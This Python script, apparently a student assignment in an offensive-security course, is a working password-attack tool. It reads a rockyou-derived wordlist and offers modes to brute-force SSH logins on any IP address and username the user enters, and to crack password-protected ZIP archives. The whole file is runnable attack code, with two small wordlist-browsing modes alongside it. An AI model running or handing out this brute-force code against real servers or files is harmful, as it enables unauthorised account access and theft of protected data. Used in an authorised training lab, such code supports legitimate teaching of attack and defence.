#!/usr/bin/env python3
# Script Name:                  Ops 18 Automated Brute Force Wordlist Attack Tool Part 3 of 3
# Author:                       Juan Miguel Cano
# Date of latest revision:      01/31/2024      
# Purpose:                      Provides modes for interacting with a word list file, allowing users to
# Purpose cont:                 iterate through the list with delays (simulating a dictionary attack), 
# Purpose cont:                 search for specific words within the list, authenticate to an SSH server by its IP address,
# Purpose cont:                 or brute force attack a password-locked zip file.

import time
import paramiko
import zipfile

# Function to perform Mode 1: Offensive; Dictionary Iterator
def offensive_mode(file_path):
    delay = float(input("Enter the delay between words (in seconds): "))
    max_lines = int(input("Enter the maximum number of lines to display: "))
    line_count = 0
    try:
        with open(file_path, 'r') as file:
            while True:
                word = file.readline().strip()
                if not word:
                    break
                print(word)
                line_count += 1
                if line_count >= max_lines:
                    break
                time.sleep(delay)
    except FileNotFoundError:
        print("File not found.")

# Function to perform Mode 2: Defensive; Password Recognized
def defensive_mode(file_path):
    user_input = input("Enter a word to search: ")
    try:
        with open(file_path, 'r', errors='ignore') as file:
            while True:
                line = file.readline()
                if not line:
                    break
                word = line.strip()
                if user_input == word:
                    print("The word is in the word list.")
                    return
            print("The word is not in the word list.")
    except FileNotFoundError:
        print("File not found.")

# Function to perform SSH brute force using the wordlist
def ssh_brute_force(file_path, ip_address, username):
    try:
        with open(file_path, 'r') as file:
            for word in file:
                password = word.strip()
                print(f"Trying password: {password}")
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                try:
                    ssh.connect(ip_address, username=username, password=password)
                    print(f"Login successful for password: {password}")
                    return
                except paramiko.AuthenticationException:
                    print("Authentication failed. Trying next password.")
                ssh.close()
                time.sleep(1)
    except FileNotFoundError:
        print("File not found.")

# Function to perform ZIP Brute Force Attack
def zip_brute_force(file_path, zip_file_path):
    try:
        with zipfile.ZipFile(zip_file_path, 'r') as zf:
            with open(file_path, 'r') as file:
                for word in file:
                    password = word.strip()
                    print(f"Trying password: {password}")
                    try:
                        zf.extractall(pwd=bytes(password, 'utf-8'))
                        print(f"Password found: {password}")
                        return password
                    except zipfile.BadZipFile:
                        print(f"Bad zip file: {zip_file_path}")
                        break
                    except RuntimeError as e:
                        if 'Bad password' in str(e):
                            pass  # Incorrect password, move to the next
                        else:
                            print(f"Runtime error: {e}")
                            break
    except FileNotFoundError:
        print(f"File not found. Please check the path and try again: {zip_file_path}")
    except zipfile.BadZipFile:
        print(f"Bad zip file or format not supported by zipfile module: {zip_file_path}")

if __name__ == "__main__":
    mode = input("Select a mode (1 for Offensive, 2 for Defensive, 3 for SSH Brute Force, 4 for ZIP Brute Force): ")
    file_path = "smaller_rockyou.txt"  # Use the smaller wordlist file as the wordlist

    if mode == '1':
        offensive_mode(file_path)
    elif mode == '2':
        defensive_mode(file_path)
    elif mode == '3':
        ip_address = input("Enter the IP address of the SSH server: ")
        username = input("Enter the SSH username: ")
        ssh_brute_force(file_path, ip_address, username)
    elif mode == '4':
        zip_file_path = input("Enter the path of the ZIP file: ")
        result = zip_brute_force(file_path, zip_file_path)
        if result:
            print(f"Success! The password for the ZIP file is: {result}")
        else:
            print("Failed to find the password for the ZIP file. Try another wordlist.")
    else:
        print
